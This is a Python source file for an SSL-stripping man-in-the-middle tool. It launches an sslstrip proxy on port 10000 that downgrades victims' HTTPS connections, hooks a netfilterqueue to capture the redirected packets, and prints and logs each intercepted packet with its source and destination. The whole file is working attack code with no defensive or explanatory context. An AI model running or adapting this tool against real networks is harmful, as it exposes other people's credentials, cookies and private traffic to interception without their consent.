import logging
import threading
import scapy.all as scapy
import netfilterqueue
from rich import print
from rich.markup import escape
from sslstrip.plugins_manager import ProxyPluginsManager
from sslstrip.StrippingProxy import StrippingProxy
from sslstrip.URLMonitor import URLMonitor
from sslstrip.CookieCleaner import CookieCleaner
from rich.panel import Panel

from twisted.internet import reactor
from twisted.web import http

class SSLStripping():

    def __init__(self):
        # ini
        listenPort   = 10000
        spoofFavicon = False
        killSessions = False

        logFile      = 'sslstrip.log'
        logLevel     = logging.INFO
        logging.basicConfig(level=logLevel, format='%(asctime)s %(message)s',
                    filename=logFile, filemode='w')
        
        URLMonitor.getInstance().setFaviconSpoofing(spoofFavicon)
        CookieCleaner.getInstance().setEnabled(killSessions)

        strippingFactory              = http.HTTPFactory(timeout=10)
        strippingFactory.protocol     = StrippingProxy

        reactor.listenTCP(int(listenPort), strippingFactory)
        # send this to a seperate thread
        self.queue = netfilterqueue.NetfilterQueue()
        self.queue.bind(0, self._payload_information)
        threading.Thread(target=self.queue.run).start()
        reactor.run()
    
    def _payload_information(self, packet):
        http_packet = scapy.IP(packet.get_payload())
        # if we have an intercepted TCP packet with data log it
        if http_packet.haslayer(scapy.TCP) and (http_packet[scapy.TCP].sport == 10000 or http_packet[scapy.TCP].dport == 10000):
            print(Panel(escape(http_packet.show(dump=True)), title=f"{http_packet[scapy.IP].src} -> {http_packet[scapy.IP].dst}", border_style="red"))
        packet.accept()